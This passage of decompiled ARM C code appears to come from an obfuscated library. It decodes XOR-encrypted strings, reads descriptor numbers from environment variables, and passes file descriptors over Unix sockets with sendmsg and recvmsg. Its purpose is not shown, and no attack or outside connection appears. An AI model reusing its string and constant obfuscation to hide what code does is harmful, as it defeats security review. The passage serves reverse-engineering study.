    iVar11 = DAT_00026de8;
    *pbVar13 = *(byte *)(DAT_00026de8 + 0x266bc) ^ 100;
    *(byte *)(iVar5 + 0x26525) = *(byte *)(iVar11 + 0x266bd) ^ 0x49;
    *(byte *)(iVar5 + 0x26526) = *(byte *)(iVar11 + 0x266be) ^ 0xa0;
    *(byte *)(iVar5 + 0x26527) = *(byte *)(iVar11 + 0x266bf) ^ 0x6e;
    *(byte *)(iVar5 + 0x26528) = *(byte *)(iVar11 + 0x266c0) ^ 0x55;
    *(byte *)(iVar5 + 0x26529) = *(byte *)(iVar11 + 0x266c1) ^ 0x68;
    *(byte *)(iVar5 + 0x2652a) = *(byte *)(iVar11 + 0x266c2) ^ 0xe;
    *(byte *)(iVar5 + 0x2652b) = *(byte *)(iVar11 + 0x266c3) ^ 0x5e;
    *(byte *)(iVar5 + 0x2652c) = *(byte *)(iVar11 + 0x266c4) ^ 0x69;
    *(byte *)(iVar5 + 0x2652d) = *(byte *)(iVar11 + 0x266c5) ^ 0xfe;
    *(byte *)(iVar5 + 0x2652e) = *(byte *)(iVar11 + 0x266c6) ^ 0x6a;
    *(byte *)(iVar5 + 0x2652f) = *(byte *)(iVar11 + 0x266c7) ^ 0x39;
    *(byte *)(iVar5 + 0x26530) = *(byte *)(iVar11 + 0x266c8) ^ 100;
    *(byte *)(iVar5 + 0x26531) = *(byte *)(iVar11 + 0x266c9) ^ 0x56;
    *(byte *)(iVar5 + 0x26532) = *(byte *)(iVar11 + 0x266ca) ^ 0x44;
    *(byte *)(iVar5 + 0x26533) = *(byte *)(iVar11 + 0x266cb) ^ 0xe5;
    *(byte *)(iVar5 + 0x26534) = *(byte *)(iVar11 + 0x266cc) ^ 0x8a;
    *(byte *)(iVar5 + 0x26535) = *(byte *)(iVar11 + 0x266cd) ^ 0xa5;
    *(byte *)(iVar5 + 0x26536) = *(byte *)(iVar11 + 0x266ce) ^ 0xa4;
    *(byte *)(iVar5 + 0x26537) = *(byte *)(iVar11 + 0x266cf) ^ 0x36;
    *(byte *)(iVar5 + 0x26538) = *(byte *)(iVar11 + 0x266d0) ^ 2;
    *(byte *)(iVar5 + 0x26539) = *(byte *)(iVar11 + 0x266d1) ^ 0x51;
    *(byte *)(iVar5 + 0x2653a) = *(byte *)(iVar11 + 0x266d2) ^ 0x79;
    *(byte *)(iVar5 + 0x2653b) = *(byte *)(iVar11 + 0x266d3) ^ 0x3a;
    *(byte *)(iVar5 + 0x2653c) = *(byte *)(iVar11 + 0x266d4) ^ 0x5a;
    *(byte *)(iVar5 + 0x2653d) = *(byte *)(iVar11 + 0x266d5) ^ 0x9d;
    iVar11 = DAT_00026dec;
    *pbVar20 = *(byte *)(DAT_00026dec + 0x267fc) ^ 0x26;
    *(byte *)(iVar6 + 0x26529) = *(byte *)(iVar11 + 0x267fd) ^ 0x1c;
    *(byte *)(iVar6 + 0x2652a) = *(byte *)(iVar11 + 0x267fe) ^ 0xae;
    *(byte *)(iVar6 + 0x2652b) = *(byte *)(iVar11 + 0x267ff) ^ 0xe6;
    *(byte *)(iVar6 + 0x2652c) = *(byte *)(iVar11 + 0x26800) ^ 0x37;
    *(byte *)(iVar6 + 0x2652d) = *(byte *)(iVar11 + 0x26801) ^ 4;
    *(byte *)(iVar6 + 0x2652e) = *(byte *)(iVar11 + 0x26802) ^ 0xae;
    *(byte *)(iVar6 + 0x2652f) = *(byte *)(iVar11 + 0x26803) ^ 0x53;
    *(byte *)(iVar6 + 0x26530) = *(byte *)(iVar11 + 0x26804) ^ 0xac;
    *(byte *)(iVar6 + 0x26531) = *(byte *)(iVar11 + 0x26805) ^ 6;
    *(byte *)(iVar6 + 0x26532) = *(byte *)(iVar11 + 0x26806) ^ 0x7a;
    *(byte *)(iVar6 + 0x26533) = *(byte *)(iVar11 + 0x26807) ^ 0x67;
    *(byte *)(iVar6 + 0x26534) = *(byte *)(iVar11 + 0x26808) ^ 0xc9;
    *(byte *)(iVar6 + 0x26535) = *(byte *)(iVar11 + 0x26809) ^ 0xa6;
    *(byte *)(iVar6 + 0x26536) = *(byte *)(iVar11 + 0x2680a) ^ 0x1a;
    *(byte *)(iVar6 + 0x26537) = *(byte *)(iVar11 + 0x2680b) ^ 0x23;
    *(byte *)(iVar6 + 0x26538) = *(byte *)(iVar11 + 0x2680c) ^ 0xdc;
    *(byte *)(iVar6 + 0x26539) = *(byte *)(iVar11 + 0x2680d) ^ 0x6b;
    *(byte *)(iVar6 + 0x2653a) = *(byte *)(iVar11 + 0x2680e) ^ 0x2a;
    *(byte *)(iVar6 + 0x2653b) = *(byte *)(iVar11 + 0x2680f) ^ 0xda;
    *(byte *)(iVar6 + 0x2653c) = *(byte *)(iVar11 + 0x26810) ^ 0x44;
    *(byte *)(iVar6 + 0x2653d) = *(byte *)(iVar11 + 0x26811) ^ 0xa0;
    *(byte *)(iVar6 + 0x2653e) = *(byte *)(iVar11 + 0x26812) ^ 0x3e;
    *(byte *)(iVar6 + 0x2653f) = *(byte *)(iVar11 + 0x26813) ^ 0xf;
    *(byte *)(iVar6 + 0x26540) = *(byte *)(iVar11 + 0x26814) ^ 0xf;
  }
  DataMemoryBarrier(0xb);
  *piVar19 = 1;
  if (param_1 == (int *)0x0) {
    uVar16 = (DAT_00026dc4 | 0x16) ^ DAT_00026dc4;
    puVar9 = (uint *)__errno();
    *puVar9 = uVar16;
  }
  else {
    param_1[1] = 0;
    *param_1 = -1;
    local_34 = local_88;
    local_30 = param_1;
    pcVar8 = getenv((char *)(DAT_00026df0 + 0x26998));
    local_a0 = -1;
    local_9c = -1;
    local_a8[0] = -1;
    if (pcVar8 == (char *)0x0) {
LAB_000269c0:
      uVar16 = DAT_00026dc0 + 0x3d ^ DAT_00026dc0;
      puVar9 = (uint *)__errno();
      *puVar9 = uVar16;
      piVar19 = local_30;
    }
    else {
      cVar4 = *pcVar8;
      if (cVar4 == '2') {
        pcVar8 = (char *)(uint)(byte)pcVar8[1];
      }
      if (cVar4 != '2' || pcVar8 != (char *)0x0) goto LAB_000269c0;
      iVar11 = FUN_000272d8(DAT_00026df4 + 0x26a30,local_90);
      piVar19 = local_30;
      if ((iVar11 == 0) && (iVar11 = FUN_000272d8(DAT_00026df8 + 0x26a4c,local_98), iVar11 == 0)) {
        if (local_90[0] == 0xffffffff || local_98[0] == 0xffffffff) {
          uVar16 = DAT_00026dbc + 0x3f ^ DAT_00026dbc;
          puVar9 = (uint *)__errno();
          *puVar9 = uVar16;
        }
        else {
          pbVar13 = (byte *)getenv((char *)(DAT_00026dfc + 0x26aa4));
          uVar16 = extraout_r1;
          if (pbVar13 != (byte *)0x0) {
            uVar16 = (uint)*pbVar13;
          }
          if (pbVar13 != (byte *)0x0 && uVar16 != 0) {
            local_38 = pbVar13;
            local_3c = (uint *)__errno();
            *local_3c = 0;
            pbVar13 = (byte *)strtol((char *)local_38,(char **)local_48,
                                     DAT_00026d8c + 6 ^ DAT_00026d8c);
            puVar9 = local_3c;
            if ((*local_3c == 0) && (local_48[0] != local_38)) {
              bVar14 = *local_48[0];
              if (bVar14 != 0) {
                bVar14 = 1;
              }
              if ((bVar14 == 0 && -1 < (int)pbVar13) &&
                 (iVar11 = fcntl((int)pbVar13,(DAT_00026d90 | 1) ^ DAT_00026d90), puVar9 = local_3c,
                 iVar11 != -1 && iVar11 + 1 < 0 == SCARRY4(iVar11,1))) {
                local_38 = pbVar13;
                iVar11 = FUN_000273e8(pbVar13,0);
                if ((iVar11 == 0) &&
                   (iVar11 = socketpair((DAT_00026d94 | 1) ^ DAT_00026d94,0x80005,0,&local_a0),
                   uVar16 = DAT_00026d98, iVar11 == 0)) {
                  local_64 = 2;
                  local_4c = 0;
                  local_50 = 0;
                  local_62 = ((ushort)DAT_00026d9c | 1) ^ (ushort)DAT_00026d9c;
                  local_60 = (ulonglong)local_90[0] << 0x20;
                  uStack_58 = (ulonglong)local_98[0];
                  local_68 = DAT_00026d98;
                  iVar11 = FUN_000276f8(local_38,&local_68,(DAT_00026da0 | 0x20) ^ DAT_00026da0,
                                        local_9c);
                  puVar9 = local_3c;
                  if (iVar11 == 0) {
                    close(local_9c);
                    local_9c = -1;
                    iVar12 = FUN_000278f4(local_a0,local_34,(DAT_00026da4 | 0x20) ^ DAT_00026da4,
                                          local_a8);
                    iVar11 = local_a0;
                    if (iVar12 == 0) {
                      close(local_a0);
                      uVar16 = *local_34 ^ uVar16 | *(ushort *)(local_34 + 1) ^ 2 |
                               (DAT_00026da8 | 1) ^ (uint)*(ushort *)((int)local_34 + 6) ^
                               DAT_00026da8 | DAT_00026dac + 1 ^ local_34[2] ^ DAT_00026dac;
                      if (uVar16 != 0) {
                        uVar16 = 1;
                      }
                      if ((((uVar16 != 0 || local_a8[0] < 0) || (local_34[3] != local_90[0])) ||
                          (local_34[4] != local_98[0])) ||
                         (local_34[5] == 0 && local_34[6] == 0 || local_34[7] == 0)) {
                        FUN_00027ba8();
                        *local_3c = DAT_00026db4 + 0x45 ^ DAT_00026db4;
                        piVar19 = local_30;
                        goto LAB_000269d8;
                      }
                      iVar12 = FUN_000273e8(local_a8[0],(DAT_00026db0 | 1) ^ DAT_00026db0);
                      iVar11 = local_a8[0];
                      if (iVar12 == 0) {
                        *local_30 = local_a8[0];
                        uVar10 = 0;
                        if (local_a8[0] == -1 || local_a8[0] + 1 < 0 != SCARRY4(local_a8[0],1)) {
                          uVar10 = 0xffffffff;
                        }
                        goto LAB_000269fc;
                      }
                    }
                    uVar16 = *local_3c;
                    puVar9 = local_3c;
                  }
                  else {
                    uVar16 = *local_3c;
                    close(local_a0);
                    iVar11 = local_9c;
                  }
                  close(iVar11);
                  *puVar9 = uVar16;
                  piVar19 = local_30;
                }
                goto LAB_000269d8;
              }
            }
          }
          else {
            puVar9 = (uint *)__errno();
          }
          *puVar9 = (DAT_00026db8 | 0x47) ^ DAT_00026db8;
        }
      }
    }
LAB_000269d8:
    *piVar19 = -1;
  }
  uVar10 = 0xffffffff;
LAB_000269fc:
  if (**(int **)(DAT_00026e00 + 0x26a0c) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar10);
  }
  return;
}



// ---- 00026e04  FUN_00026e04  size=1092

void FUN_00026e04(int *param_1,int *param_2,int *param_3,undefined4 param_4)

{
  ushort uVar1;
  int iVar2;
  uint *puVar3;
  size_t sVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  int *unaff_r8;
  int local_15a0;
  short local_159c;
  ushort local_159a;
  int local_1598;
  uint local_1594;
  uint local_1590;
  int local_158c;
  int iStack_1588;
  int iStack_1584;
  int local_d18;
  undefined2 local_d14;
  ushort local_d12;
  int local_d10 [15];
  size_t local_cd4;
  undefined auStack_ca0 [3072];
  int local_a0 [2];
  stat sStack_98;
  int *local_30;
  int local_2c;
  undefined4 uStack_28;
  
  local_2c = **(int **)(DAT_00027294 + 0x26e20);
  uStack_28 = param_4;
  if (param_1 == (int *)0x0) {
LAB_00026e64:
    uVar9 = DAT_00027290 | 0x16;
    uVar8 = DAT_00027290;
    local_30 = param_2;
LAB_00026e6c:
    local_1594 = uVar9 ^ uVar8;
  }
  else {
    if (param_3 != (int *)0x0) {
      unaff_r8 = param_2;
    }
    if (((param_3 == (int *)0x0 || param_2 == (int *)0x0) || (*param_1 < 0)) ||
       (*(char *)unaff_r8 != '/')) goto LAB_00026e64;
    *param_3 = -1;
    local_30 = param_3;
    sVar4 = strnlen((char *)unaff_r8,0x401);
    if (0xfffffbff < sVar4 - 0x401) {
      FUN_0003524c(local_d10,0xc70);
      local_d12 = (ushort)DAT_00027248 + 0x18 ^ (ushort)DAT_00027248;
      local_cd4 = sVar4;
      __memcpy_chk(auStack_ca0,unaff_r8,sVar4,(DAT_0002724c | 0xc00) ^ DAT_0002724c);
      iVar7 = DAT_00027250;
      if (param_1[1] != -1) {
        local_d14 = 1;
        local_d18 = DAT_00027250;
        local_d10[0] = param_1[1] + ((DAT_00027254 | 1) ^ DAT_00027254);
        param_1[1] = local_d10[0];
        iVar5 = FUN_000276f8(*param_1,&local_d18,0xc78,0xffffffff);
        iVar2 = local_d10[0];
        uVar1 = local_d12;
        if (iVar5 != 0) goto LAB_00026e7c;
        local_a0[0] = -1;
        iVar6 = FUN_000278f4(*param_1,&local_15a0,0x888,local_a0);
        iVar5 = local_a0[0];
        if (iVar6 != 0) goto LAB_00026e7c;
        if ((((local_15a0 == iVar7 && local_159c == 1) && local_159a == uVar1) &&
             local_1598 == iVar2) &&
           (((iStack_1584 == 0 && local_158c == 0) && iStack_1588 == 0) &&
            local_1594 < ((DAT_00027258 | 0x1000) ^ DAT_00027258))) {
          if (local_1594 == 0) {
            if (local_1590 == ((DAT_0002725c | 1) ^ DAT_0002725c) &&
                (local_a0[0] != -1 && local_a0[0] + 1 < 0 == SCARRY4(local_a0[0],1))) {
              iVar7 = fstat(local_a0[0],&sStack_98);
              if (iVar7 == 0) {
                uVar8 = fcntl(iVar5,DAT_00027260 + 1 ^ DAT_00027260);
                uVar9 = fcntl(iVar5,(DAT_00027264 | 1) ^ DAT_00027264);
                iVar7 = fcntl(iVar5,0x40a);
                if ((sStack_98.st_mode & (DAT_0002726c + 0x1000 ^ DAT_0002726c)) ==
                    ((DAT_00027268 | 0x8000) ^ DAT_00027268)) {
                  uVar10 = (uVar8 & (DAT_00027274 + 1 ^ DAT_00027274)) -
                           ((DAT_00027270 | 1) ^ DAT_00027270);
                  if (uVar10 != 0) {
                    uVar10 = 1;
                  }
                  if (((uint)(((0 < (int)(sStack_98.st_blocks + (uint)(sStack_98.st_blksize != 0))
                                != (SBORROW4(-sStack_98.st_blocks,(uint)(sStack_98.st_blksize != 0))
                                   != false) &&
                               (uVar8 != 0xffffffff && (int)(uVar8 + 1) < 0 == SCARRY4(uVar8,1))) &&
                              (uVar9 != 0xffffffff && (int)(uVar9 + 1) < 0 == SCARRY4(uVar9,1))) &&
                             (iVar7 != -1 && iVar7 + 1 < 0 == SCARRY4(iVar7,1))) &
                      uVar10 & ((uVar8 & 0x200000) >> 0x15 ^ 1)) == 1) {
                    uVar8 = iVar7 - ((DAT_00027278 | 0xf) ^ DAT_00027278);
                    if (uVar8 != 0) {
                      uVar8 = 1;
                    }
                    if ((uVar9 & ((DAT_0002727c | 1) ^ DAT_0002727c) ^ 1 | uVar8) != 1) {
                      *local_30 = iVar5;
                      goto LAB_00026e7c;
                    }
                  }
                }
                uVar8 = DAT_00027280 + 0x39 ^ DAT_00027280;
                puVar3 = (uint *)__errno();
                *puVar3 = uVar8;
              }
              else {
                puVar3 = (uint *)__errno();
              }
              uVar8 = *puVar3;
              close(iVar5);
              *puVar3 = uVar8;
              goto LAB_00026e7c;
            }
          }
          else if ((local_a0[0] == -1 || local_a0[0] + 1 < 0 != SCARRY4(local_a0[0],1)) &&
                  ((local_1590 & 0xfffffffb) == 0)) goto LAB_00026e70;
        }
        FUN_00027ba8(local_a0[0]);
        local_1594 = 0x47;
        goto LAB_00026e70;
      }
      uVar9 = DAT_00027284 + 0x37;
      uVar8 = DAT_00027284;
      goto LAB_00026e6c;
    }
    local_1594 = DAT_0002728c + 0x1c ^ DAT_0002728c;
    if (sVar4 == 0) {
      local_1594 = (DAT_00027288 | 2) ^ DAT_00027288;
    }
  }
LAB_00026e70:
  puVar3 = (uint *)__errno();
  *puVar3 = local_1594;
LAB_00026e7c:
  if (**(int **)(DAT_00027298 + 0x26e8c) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_2c);
  }
  return;
}



// ---- 0002729c  FUN_0002729c  size=60

void FUN_0002729c(int *param_1)

{
  if (param_1 == (int *)0x0) {
    return;
  }
  if (-1 < *param_1) {
    close(*param_1);
  }
  param_1[1] = 0;
  *param_1 = -1;
  return;
}



// ---- 000272d8  FUN_000272d8  size=252

void FUN_000272d8(char *param_1,ulong *param_2,undefined4 param_3)

{
  char cVar1;
  char *pcVar2;
  uint *puVar3;
  undefined4 uVar4;
  ulong uVar5;
  uint uVar6;
  char *unaff_r6;
  char *local_30 [2];
  undefined4 uStack_28;
  int local_24;
  
  local_24 = **(int **)(DAT_000273e0 + 0x272f4);
  uStack_28 = param_3;
  pcVar2 = getenv(param_1);
  if (param_2 != (ulong *)0x0) {
    unaff_r6 = pcVar2;
  }
  if (((param_2 == (ulong *)0x0 || pcVar2 == (char *)0x0) ||
      (cVar1 = *unaff_r6, cVar1 == '\0' || cVar1 == '-')) || (cVar1 == '+')) {
    uVar6 = DAT_000273dc + 0x43 ^ DAT_000273dc;
    puVar3 = (uint *)__errno();
    *puVar3 = uVar6;
  }
  else {
    puVar3 = (uint *)__errno();
    *puVar3 = 0;
    uVar5 = strtoul(unaff_r6,local_30,(DAT_000273d4 | 10) ^ DAT_000273d4);
    if (((*puVar3 == 0) && (local_30[0] != unaff_r6)) && (*local_30[0] == '\0')) {
      *param_2 = uVar5;
      uVar4 = 0;
      goto LAB_0002733c;
    }
    *puVar3 = (DAT_000273d8 | 0x47) ^ DAT_000273d8;
  }
  uVar4 = 0xffffffff;
LAB_0002733c:
  if (**(int **)(DAT_000273e4 + 0x2734c) != local_24) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar4);
  }
  return;
}



// ---- 000273e8  FUN_000273e8  size=712

void FUN_000273e8(int param_1,sockaddr *param_2,undefined4 param_3,undefined4 param_4)

{
  sockaddr *psVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 uVar6;
  uint local_138 [2];
  uint local_130 [2];
  uint local_128 [2];
  uint local_120 [2];
  stat sStack_118;
  sockaddr local_b0 [8];
  sockaddr *local_30;
  int local_2c;
  undefined4 uStack_28;
  
  local_30 = local_b0;
  local_2c = **(int **)(DAT_000276f0 + 0x27408);
  uVar2 = 0xffffffff;
  psVar1 = param_2;
  uStack_28 = param_4;
  if (param_1 < 0) goto LAB_0002768c;
  iVar3 = fstat(param_1,&sStack_118);
  if (iVar3 == 0) {
    uVar2 = DAT_000276b0 + 0x4000 ^ DAT_000276b0;
    uVar6 = 0x5b;
    if ((sStack_118.st_mode & (DAT_000276b4 + 0x5000 ^ DAT_000276b4)) == uVar2) {
      uVar2 = fcntl(param_1,(DAT_000276b8 | 1) ^ DAT_000276b8);
      if ((int)uVar2 < 0) goto LAB_00027688;
      uVar2 = uVar2 & 1;
      if ((param_2 == (sockaddr *)0x0) == uVar2) {
        uVar6 = 0x47;
      }
      else {
        local_128[0] = (DAT_000276bc | 4) ^ DAT_000276bc;
        iVar3 = getsockopt(param_1,(DAT_000276c0 | 1) ^ DAT_000276c0,DAT_000276c4 + 1 ^ DAT_000276c4
                           ,local_138,local_128);
        if (iVar3 != 0) goto LAB_00027688;
        uVar2 = (DAT_000276cc | 4) ^ local_128[0] ^ DAT_000276cc |
                DAT_000276c8 + 3 ^ local_138[0] ^ DAT_000276c8;
        if (uVar2 == 0) {
          local_128[0] = (DAT_000276d0 | 4) ^ DAT_000276d0;
          iVar3 = getsockopt(param_1,(DAT_000276d4 | 1) ^ DAT_000276d4,
                             DAT_000276d8 + 10 ^ DAT_000276d8,local_130,local_128);
          psVar1 = local_30;
          if (iVar3 != 0) goto LAB_00027688;
          uVar6 = 0x47;
          uVar2 = (DAT_000276dc | 4) ^ local_128[0] ^ DAT_000276dc | local_130[0];
          if (uVar2 == 0) {
            FUN_0003524c(local_30,0x80);
            local_120[0] = (DAT_000276e0 | 0x80) ^ DAT_000276e0;
            iVar3 = getsockname(param_1,psVar1,local_120);
            if (iVar3 != 0) goto LAB_00027688;
            uVar6 = 0x61;
            uVar2 = psVar1->sa_family - 1;
            if (uVar2 != 0) {
              uVar2 = 1;
            }
            uVar2 = (int)local_120[0] < (int)((DAT_000276e4 | 2) ^ DAT_000276e4) | uVar2;
            if (uVar2 == 0) {
              FUN_0003524c(psVar1,0x80);
              local_120[0] = (DAT_000276e8 | 0x80) ^ DAT_000276e8;
              iVar3 = getpeername(param_1,psVar1,local_120);
              if (iVar3 != 0) goto LAB_00027688;
              uVar2 = 0;
              uVar5 = psVar1->sa_family - 1;
              if (uVar5 != 0) {
                uVar5 = 1;
              }
              psVar1 = local_30;
              if (((int)local_120[0] < (int)((DAT_000276ec | 2) ^ DAT_000276ec) | uVar5) != 1)
              goto LAB_0002768c;
            }
          }
        }
      }
    }
    puVar4 = (undefined4 *)__errno(uVar2);
    *puVar4 = uVar6;
  }
LAB_00027688:
  uVar2 = 0xffffffff;
  psVar1 = local_30;
LAB_0002768c:
  local_30 = psVar1;
  if (**(int **)(DAT_000276f4 + 0x2769c) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar2);
  }
  return;
}



// ---- 000276f8  FUN_000276f8  size=460

void FUN_000276f8(int param_1,void *param_2,void *param_3,int param_4)

{
  uint uVar1;
  void *pvVar2;
  uint *puVar3;
  uint uVar4;
  msghdr local_68;
  uint local_48;
  uint local_44;
  uint local_40;
  int local_3c;
  iovec local_38;
  void *local_30;
  int local_2c;
  int iStack_28;
  
  uVar1 = DAT_000278dc;
  uVar4 = DAT_000278d8;
  local_2c = **(int **)(DAT_000278ec + 0x27714);
  local_30 = param_2;
  iStack_28 = param_4;
  if (param_4 == -1 || param_4 + 1 < 0 != SCARRY4(param_4,1)) {
    do {
      pvVar2 = (void *)sendto(param_1,param_2,(size_t)param_3,DAT_000278e4 + 0x4000 ^ DAT_000278e4,
                              (sockaddr *)0x0,0);
      if (pvVar2 != (void *)0xffffffff && (int)pvVar2 + 1 < 0 == SCARRY4((int)pvVar2,1)) break;
      uVar4 = DAT_000278e0 + 4 ^ DAT_000278e0;
      puVar3 = (uint *)__errno();
    } while (*puVar3 == uVar4);
  }
  else {
    local_68.msg_name = (void *)0x0;
    local_68.msg_namelen = 0;
    local_68.msg_flags = 0;
    local_68.msg_controllen = (DAT_000278c4 | 0x10) ^ DAT_000278c4;
    local_68.msg_iovlen = (DAT_000278c8 | 1) ^ DAT_000278c8;
    local_40 = (DAT_000278cc | 1) ^ DAT_000278cc;
    local_44 = (DAT_000278d0 | 1) ^ DAT_000278d0;
    local_48 = (DAT_000278d4 | 0x10) ^ DAT_000278d4;
    local_68.msg_iov = &local_38;
    local_68.msg_control = &local_48;
    local_3c = param_4;
    local_38.iov_base = param_2;
    local_38.iov_len = (size_t)param_3;
    local_30 = param_3;
    do {
      pvVar2 = (void *)sendmsg(param_1,&local_68,uVar1 ^ uVar1 + 0x4000);
      param_3 = local_30;
      if (pvVar2 != (void *)0xffffffff && (int)pvVar2 + 1 < 0 == SCARRY4((int)pvVar2,1)) break;
      puVar3 = (uint *)__errno();
      param_3 = local_30;
    } while (*puVar3 == (uVar4 + 4 ^ uVar4));
  }
  if ((pvVar2 != param_3) && (-1 < (int)pvVar2)) {
    uVar4 = DAT_000278e8 + 0x3f ^ DAT_000278e8;
    puVar3 = (uint *)__errno();
    *puVar3 = uVar4;
  }
  if (**(int **)(DAT_000278f0 + 0x278ac) == local_2c) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(local_2c);
}



// ---- 000278f4  FUN_000278f4  size=624

void FUN_000278f4(int param_1,size_t *param_2,size_t param_3,size_t *param_4)

{
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  size_t sVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  cmsghdr *__cmsg;
  uint uVar8;
  uint uVar9;
  bool bVar10;
  msghdr local_78;
  cmsghdr local_58;
  undefined4 local_4c;
  undefined4 uStack_48;
  undefined8 uStack_44;
  iovec local_38;
  size_t *local_30;
  int local_2c;
  size_t *psStack_28;
  
  local_2c = **(int **)(DAT_00027ba0 + 0x27910);
  psStack_28 = param_4;
  if (param_2 == (size_t *)0x0 || param_4 == (size_t *)0x0) {
    uVar6 = DAT_00027b9c + 10;
    uVar8 = DAT_00027b9c;
    local_30 = param_2;
  }
  else {
    *param_4 = 0xffffffff;
    local_30 = param_4;
    FUN_0003524c(param_2,param_3);
    uVar8 = DAT_00027b6c;
    local_58.cmsg_len = 0;
    local_58.cmsg_level = 0;
    local_58.cmsg_type = 0;
    local_4c = 0;
    uStack_48 = 0;
    uStack_44 = 0;
    local_78.msg_name = (void *)0x0;
    local_78.msg_namelen = 0;
    local_78.msg_iovlen = (DAT_00027b64 | 1) ^ DAT_00027b64;
    local_78.msg_flags = 0;
    local_78.msg_controllen = DAT_00027b68 + 4 ^ DAT_00027b68;
    local_78.msg_iov = &local_38;
    local_78.msg_control = &local_58;
    local_38.iov_base = param_2;
    local_38.iov_len = param_3;
    do {
      sVar4 = recvmsg(param_1,&local_78,0x40000000);
      if (sVar4 != 0xffffffff && (int)(sVar4 + 1) < 0 == SCARRY4(sVar4,1)) break;
      puVar3 = (uint *)__errno();
    } while (*puVar3 == (uVar8 + 4 ^ uVar8));
    uVar2 = DAT_00027b88;
    uVar1 = DAT_00027b84;
    uVar6 = DAT_00027b80;
    uVar8 = DAT_00027b7c;
    if ((sVar4 != param_3) || ((local_78.msg_flags & ((DAT_00027b70 | 0x28) ^ DAT_00027b70)) != 0))
    {
      if (-1 < (int)sVar4) {
        FUN_00027bd8(&local_78);
        uVar8 = DAT_00027b74 + 0x39 ^ DAT_00027b74;
        puVar3 = (uint *)__errno();
        *puVar3 = uVar8;
      }
      goto LAB_00027a80;
    }
    uVar9 = 0;
    sVar4 = 0xffffffff;
    __cmsg = (cmsghdr *)local_78.msg_control;
    if (local_78.msg_controllen <= (DAT_00027b78 + 5 ^ DAT_00027b78)) {
      __cmsg = (cmsghdr *)0x0;
    }
    for (; __cmsg != (cmsghdr *)0x0; __cmsg = __cmsg_nxthdr(&local_78,__cmsg)) {
      uVar7 = __cmsg->cmsg_level;
      uVar5 = uVar2 ^ uVar2 + 1;
      bVar10 = uVar7 == uVar5;
      if (bVar10) {
        uVar7 = __cmsg->cmsg_type;
        uVar5 = uVar6 ^ uVar6 + 1;
      }
      if ((!bVar10 || uVar7 != uVar5) || (__cmsg->cmsg_len != (uVar8 + 0x10 ^ uVar8))) {
        FUN_00027bd8(&local_78);
        uVar8 = DAT_00027b8c;
        goto LAB_00027b14;
      }
      sVar4 = __cmsg[1].cmsg_len;
      uVar9 = uVar9 + (uVar1 ^ uVar1 + 1);
    }
    if (uVar9 <= ((DAT_00027b90 | 1) ^ DAT_00027b90)) {
      if (uVar9 != ((DAT_00027b94 | 1) ^ DAT_00027b94)) {
        sVar4 = 0xffffffff;
      }
      *local_30 = sVar4;
      goto LAB_00027a80;
    }
    FUN_00027bd8(&local_78);
    uVar8 = DAT_00027b98;
LAB_00027b14:
    uVar6 = uVar8 + 0x3b;
  }
  puVar3 = (uint *)__errno();
  *puVar3 = uVar6 ^ uVar8;
LAB_00027a80:
  if (**(int **)(DAT_00027ba4 + 0x27a90) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_2c);
  }
  return;
}



// ---- 00027ba8  FUN_00027ba8  size=48

void FUN_00027ba8(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  puVar1 = (undefined4 *)__errno();
  uVar2 = *puVar1;
  if (-1 < param_1) {
    close(param_1);
  }
  *puVar1 = uVar2;
  return;
}



// ---- 00027bd8  FUN_00027bd8  size=252

void FUN_00027bd8(msghdr *param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int __fd;
  uint uVar5;
  uint uVar6;
  cmsghdr *__cmsg;
  
  uVar3 = DAT_00027cec;
  uVar2 = DAT_00027ce8;
  uVar1 = DAT_00027cdc;
  if (param_1 != (msghdr *)0x0) {
    __cmsg = (cmsghdr *)0x0;
    if ((DAT_00027cd4 + 9 ^ DAT_00027cd4) < param_1->msg_controllen) {
      __cmsg = (cmsghdr *)param_1->msg_control;
    }
    for (; __cmsg != (cmsghdr *)0x0; __cmsg = __cmsg_nxthdr(param_1,__cmsg)) {
      if (((__cmsg->cmsg_level == (uVar3 ^ uVar3 + 1)) &&
          (__cmsg->cmsg_type == (DAT_00027ce0 ^ DAT_00027ce0 + 1))) &&
         (uVar4 = __cmsg->cmsg_len, (DAT_00027cd8 + 4 ^ DAT_00027cd8) <= uVar4)) {
        uVar5 = DAT_00027ce4 + 2 ^ DAT_00027ce4;
        for (uVar6 = 0; uVar6 != uVar4 - 0xc >> (uVar5 & 0xff); uVar6 = uVar6 + (uVar1 ^ uVar1 + 1))
        {
          __fd = *(int *)((int)&__cmsg[1].cmsg_len + (uVar6 << ((uVar2 + 2 ^ uVar2) & 0xff)));
          if (-1 < __fd) {
            close(__fd);
          }
        }
      }
    }
  }
  return;
}



// ---- 00027cf0  FUN_00027cf0  size=288

void FUN_00027cf0(int param_1,char *param_2,undefined4 param_3,undefined4 param_4)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  byte *pbVar7;
  undefined4 local_8;
  undefined4 local_4;
  
  iVar4 = DAT_00027e18;
  iVar6 = DAT_00027e14;
  piVar5 = (int *)(DAT_00027e10 + 0x27d18);
  DataMemoryBarrier(0xb);
  if (*piVar5 == 0) {
    pbVar7 = (byte *)(DAT_00027e18 + 0x27d3c);
    bVar1 = *(byte *)(DAT_00027e1c + 0x27d41);
    *(byte *)(DAT_00027e14 + 0x27d38) = *(byte *)(DAT_00027e1c + 0x27d40) ^ 0x2e;
    *(byte *)(iVar6 + 0x27d39) = bVar1 ^ 0x2c;
    iVar6 = DAT_00027e20;
    bVar1 = *(byte *)(DAT_00027e20 + 0x27d61);
    bVar2 = *(byte *)(DAT_00027e20 + 0x27d62);
    *pbVar7 = *(byte *)(DAT_00027e20 + 0x27d60) ^ 0x59;
    bVar3 = *(byte *)(iVar6 + 0x27d63);
